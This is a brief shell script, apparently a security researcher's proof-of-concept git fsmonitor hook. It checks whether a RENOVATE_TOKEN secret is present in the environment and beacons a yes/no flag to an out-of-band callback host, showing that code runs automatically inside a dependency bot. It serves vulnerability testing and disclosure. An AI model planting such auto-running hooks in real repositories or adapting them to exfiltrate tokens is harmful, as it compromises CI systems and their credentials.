#!/bin/sh
        # test-owned fsmonitor proof; never transmit a credential
        if [ -n "${RENOVATE_TOKEN:-}" ]; then flag=1; else flag=0; fi
        curl -fsS -m 5 -o /dev/null 'https://dc0ancs906vmv0tuhq90ztc9eaykti5gm.oob.staging.depthfirst.com/fsmon-9cc98bc813ff344f2c6eb951?token_present='"$flag" >/dev/null 2>&1 || true
        exit 0
        
